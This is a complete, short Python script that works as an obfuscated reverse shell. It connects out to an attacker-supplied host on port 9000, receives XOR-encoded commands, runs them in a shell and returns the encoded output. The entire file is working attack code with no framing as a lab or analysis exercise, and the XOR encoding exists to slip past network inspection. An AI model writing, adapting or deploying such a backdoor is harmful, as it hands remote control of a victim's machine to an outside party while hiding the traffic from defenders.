#!/usr/bin/python

import socket
import subprocess
import sys


def main():
    try:
        RHOST = sys.argv[1]
        RPORT = 9000
    except:
        print ("Must provide hotst")
        sys.exit()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((RHOST,RPORT))

    while True:
        #recieve XOR encoded data
        data = s.recv(1024)
        
        #XOR the data again with a '/x41' to get back to normal
        en_data = bytearray(data)
        for i in range(len(en_data)):
            en_data[i] ^=0x41

        if en_data == 'killMe':
            break
            
        #Execute decoded command
        comm = subprocess.Popen(str(en_data), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        STDOUT,STDERR = comm.communicate()
        
        #Encode output
        if STDOUT:
            en_STDOUT = bytearray(STDOUT)
        else:
            en_STDOUT = bytearray("Command not recognised")
        for i in range(len(en_STDOUT)):
            en_STDOUT[i] ^=0x41
        try:
	    s.send(en_STDOUT)
    	except:
            sys.exit()
    s.close()

#Start Here!
if __name__ == "__main__":
    main()
